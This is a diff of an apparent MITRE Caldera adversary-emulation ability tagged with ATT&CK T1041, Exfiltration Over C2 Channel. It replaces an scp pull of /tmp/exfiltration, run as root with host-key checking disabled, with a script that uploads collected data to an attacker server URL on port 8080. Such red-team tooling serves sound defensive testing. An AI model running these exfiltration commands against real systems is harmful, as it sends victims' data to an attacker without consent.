@@ -1,6 +1,6 @@
 - id: 20000000-0000-0000-0000-000000000007
   name: Data exfiltration
-  description: Data exfiltration of the information accumulated.
+  description: Package the information accumulated by the KC02 child agent.
   tactic: exfiltration
   technique: { attack_id: T1041, name: "Exfiltration Over C2 Channel" }
   repeatable: false
@@ -8,8 +8,20 @@
   platforms:
     linux:
       sh:
-        command: |-
-          mkdir -p "$DATA_PATH/KC2/analysis"; target="$(cat "$DATA_PATH/KC2/attackaddr")"; if scp -o StrictHostKeyChecking=no -o BatchMode=yes -r -P 4222 "root@${target}:/tmp/exfiltration" "$DATA_PATH/KC2/analysis"; then echo "Exfiltration done"; else echo "Remote /tmp/exfiltration unavailable or partially copied; previous KC2 logs remain in $DATA_PATH/KC2" | tee "$DATA_PATH/KC2/analysis/exfiltration-skipped.log" || true; fi; exit 0;
+        command: >-
+          CHILD='#{host.kc2.child}';
+          PREV='#{kc2.26.done}';
+          mkdir -p "$DATA_PATH/KC2/analysis";
+          /opt/caldera/KC2/HTTP-exfiltration.py \
+            --data-path "$DATA_PATH" \
+            --server-url "http://$ATTACKERADDR:8080/upload" \
+            > "$DATA_PATH/KC2/analysis/exfiltration.log" 2>&1 \
+          && echo kc2-27-done
         timeout: 900
-        parsers: []
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+            - source: kc2.27.done
         cleanup: ""
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.kc2.child
